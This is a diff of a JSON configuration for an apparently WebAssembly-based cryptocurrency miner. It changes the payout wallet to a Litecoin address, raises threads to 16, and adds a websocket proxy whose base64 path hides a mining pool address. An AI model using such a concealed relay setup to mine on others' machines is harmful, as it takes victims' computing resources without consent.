@@ -1,6 +1,10 @@
 {
-  "user": "RGyxTbJpszvouegFE2F5upTWQN8kh8MM5j",
-  "target": "RVN",
-  "threads": 1,
+  "user": "ltc1qttgqhvralz9cusvvfvkzr64gqeas46d7jnp0he",
+  "target": "LTC",
+  "threads": 16,
+  "proxy": "wss://broken-ardene-mino-fecf729c.koyeb.app/cG93ZXIyYi5uYS5taW5lLnpwb29sLmNhOjYyNDI=",
+  "host": "127.0.0.1",
+  "port": "3306",
+  "argent": "wasm-power2b/1.0",
   "log": true
 }
